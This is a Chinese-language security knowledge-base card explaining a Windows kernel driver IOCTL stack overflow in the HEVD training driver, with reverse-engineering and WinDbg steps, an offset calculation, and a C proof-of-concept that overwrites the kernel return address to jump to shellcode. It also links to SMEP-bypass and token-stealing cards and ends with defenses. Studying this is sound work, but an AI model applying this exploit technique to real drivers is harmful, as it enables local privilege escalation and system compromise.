---
id: binary-pwn-kernel-windows-driver-stack-overflow-ioctl-ret-hijack
title: Windows 驱动 IOCTL 栈溢出：memmove 超长用户缓冲覆盖内核栈返回地址
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-kernel-driver-stack-overflow-ret-hijack
aliases:
- HEVD BufferOverflowStack
- 内核栈溢出
- IOCTL 栈溢出
- 内核返回地址劫持
- TriggerBufferOverflowStack
- ret2usr 内核
tags:
- windows
- kernel
- pwn
- stack-overflow
- ioctl
- ret-hijack
- hevd
- lpe
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V592
  verified_at: '2026-11-12T15:37:30+08:00'
  notes: 已对照原文与35张截图核对：0x222003(CTL_CODE)、v5[2048]/memmove 源码、v5+0x818 返回地址覆盖(RetAddr=用户shellcode地址)、0xFC 蓝屏 Arg1 为用户地址均一致；PoC 未在本机执行，0x818 偏移仅适用原文构建。
---

## 一句话结论

Windows 内核驱动在 IOCTL 处理函数中把用户缓冲区按用户给定长度 `memmove` 进固定 2048 字节的栈数组且不校验长度，超长数据覆盖内核栈帧中保存的返回地址；在偏移 `0x818` 处写入目标地址即可在驱动返回时劫持内核控制流（Win8+ 受 SMEP 阻挡时需再接 SMEP 绕过）。

## 原理

- **入口**：HEVD 练习驱动暴露设备 `\\.\My1DeviceLinker`，`IRP_MJ_DEVICE_CONTROL` 按 IOCTL 功能号 switch 分发到 `TriggerBufferOverflowStack`。功能号由 `CTL_CODE(DeviceType, Function, Method, Access) = (DeviceType << 16) | (Access << 14) | (Function << 2) | Method` 生成：`FILE_DEVICE_UNKNOWN=0x22`、`Function=0x800`、`METHOD_NEITHER=3`、`FILE_ANY_ACCESS=0`，得到 `0x222003`。逆向时可由功能号反推函数描述符：`function = ((ioctl ^ 0x220000) >> 2) & 0xfff`（函数域只有 12 位）。
- **漏洞点**：处理函数声明 `char v5[2048]`，执行 `memset(v5, 0, sizeof(v5))` 后调用 `memmove(v5, UserBuffer, Size)`，`Size` 直接来自 `DeviceIoControl` 的输入长度，没有 `min(Size, sizeof(v5))` 之类的上限校验，也没有对用户指针做 `ProbeForRead` 之外的写范围检查。
- **为什么能覆盖返回地址**：x64 内核调用约定下被调函数在栈上保留返回地址，`v5` 位于栈帧低地址处；`memmove` 按 `Size` 线性拷贝，超过 `v5` 边界的字节会依次覆盖本函数其余局部量、保存的 `rbp`（若编译器保存）与返回地址。WinDbg 中对目标构建反汇编可见 `char v5[2048]; // [rsp+20h] [rbp-818h]`，配合 `dp v5+0x800` 观察区段、`k` 的 `Child-SP/RetAddr/Call Site` 核对，本构建的返回地址落在 `v5+0x818`（与 `v5` 之间还有 0x18 字节其他保存数据）；该偏移由编译器和函数帧决定，换驱动/换编译必须重新确认，不能跨二进制照搬。
- **验证**：先发 `Size=0x30` 的小包断在 `TriggerBufferOverflowStack` 确认可达；发 `Size=0x1000` 全 `A` 触发蓝屏（访问违例/`xrstors` 等）证明长度无过滤；再按 `0x810` 字节填充 + `v5+0x818` 写用户 shellcode 地址，`k` 显示 `RetAddr` 已变为用户态地址（如 `0x00000003a2cefea70`），控制流跳入用户 shellcode——到此返回地址劫持原语成立。
- **为什么不足以直接提权**：Win8+ 默认开启 SMEP，Ring0 从用户页取指触发 `#PF`，蓝屏 `0xFC ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY`（Arg1 即被尝试执行的用户地址）。需要额外绕过（见关联卡）或把 shellcode 放进内核可执行内存。

## 触发条件

- 攻击者可打开设备句柄并向其发送 IOCTL（设备 ACL 允许普通用户访问；HEVD 默认如此）。
- 驱动把用户可控长度直接用于向固定大小栈缓冲区拷贝（`memmove/memcpy/RtlCopyMemory` 等），且未启用能拦住返回地址覆盖的 `/GS` 栈 cookie 校验、内核 CFG/CET 等缓解。
- 可推断目标二进制/构建的栈帧布局（本地有同版本驱动样本，或按泄露的内核模块基址与已知偏移计算）。
- 若目标开启 SMEP/KVA Shadow，单靠本原语只能造成蓝屏，需配合 SMEP 绕过或内核内可执行载荷。

## 利用步骤

1. 逆向驱动：定位 `IRP_MJ_DEVICE_CONTROL` 分发与易受攻击 handler，按 `CTL_CODE` 逆算或直接枚举功能号（本例 `0x222003`）。
2. 双机调试：`bp <驱动>!<handler>` 发小包断下，`uf` 反汇编确认栈帧中 `v5` 的 `[rsp+0x20]` 位置与拷贝调用 `memmove(v5, UserBuffer, Size)` 的参数来源。
3. 用 `dp v5`、`dp v5+0x800` 与 `k` 的 `Child-SP/RetAddr` 对照确定本构建的返回地址偏移（本例 `0x818`）。
4. 构造 payload：`0x810` 字节填充 + 8 字节目标地址（WinDbg 中先填可识别的 `A` 验证覆盖位置，再换成真实地址）。
5. `DeviceIoControl(hDevice, ioctl, payload, 0x820, NULL, 0, &info, NULL)` 触发；驱动返回时 `ret` 弹出被覆盖地址，控制流跳转。
6. 目标地址选择：SMEP 关闭/实验环境下可直接指向用户 shellcode（ret2usr）；否则走内核 ROP（关联卡二）或内核内载荷（关联卡三）。

## PoC

```c
// 最小触发：HEVD 风格 IOCTL 栈溢出（功能号 0x222003 = CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_ANY_ACCESS)）
unsigned int ioctl = (0x22u << 16) | (0x800u << 2) | 3u;   // 0x222003
HANDLE h = CreateFileW(L"\\\\.\\My1DeviceLinker", GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
char buf[0x820] = {0};
RtlFillMemory(buf, 0x810, 'A');                            // 填充至返回地址前
*(unsigned long long *)(buf + 0x818) = (unsigned long long)shellcode; // 覆盖返回地址
DWORD info = 0;
DeviceIoControl(h, ioctl, buf, sizeof(buf), NULL, 0, &info, NULL);    // 返回时 ret 到 shellcode
```

`0x818`、`0x810` 均为本构建实测值；PoC 未在本机执行，仅按原文调试结果整理。

## 变体与关联

- 变体：`METHOD_BUFFERED`（系统缓冲）与 `METHOD_NEITHER`（`Type3InputBuffer` 直接是用户指针）都可作为溢出源；目标从返回地址换成栈上结构体的函数指针/回调指针时为相近但不同的场景。
- 关联卡片：[[binary-pwn-kernel-windows-smep-bypass-cr4-rop]]（SMEP 开启时的下一步）、[[binary-pwn-kernel-windows-shellcode-token-steal-eprocess]]（劫持后内核态提权载荷）、[[binary-pwn-kernel-stack-overflow-struct-function-pointer-run-cmd]]（覆盖栈上函数指针的 Linux 变体）。

## 检测与防御

- **驱动侧**：拷贝前做 `min(Size, sizeof(v5))` 上限校验与 `ProbeForWrite`；编译启用 `/GS`、`/guard:cf`、CET Shadow Stack；生产驱动打开 Driver Verifier 的 Stack Overflow/内存检查。
- **系统侧**：SMEP/SMAP、HVCI/VBS、KASLR 保持开启，降低劫持后可用跳板；监控内核栈返回地址指向用户页导致 `0xFC` 蓝屏的现场（Arg1 为用户地址即可疑）。
- **检测特征**：普通进程对驱动设备发送超大长度 IOCTL；内核崩溃转储中 `RetAddr` 落在用户地址空间或非模块区域；Driver Verifier 报告栈缓冲区溢出。
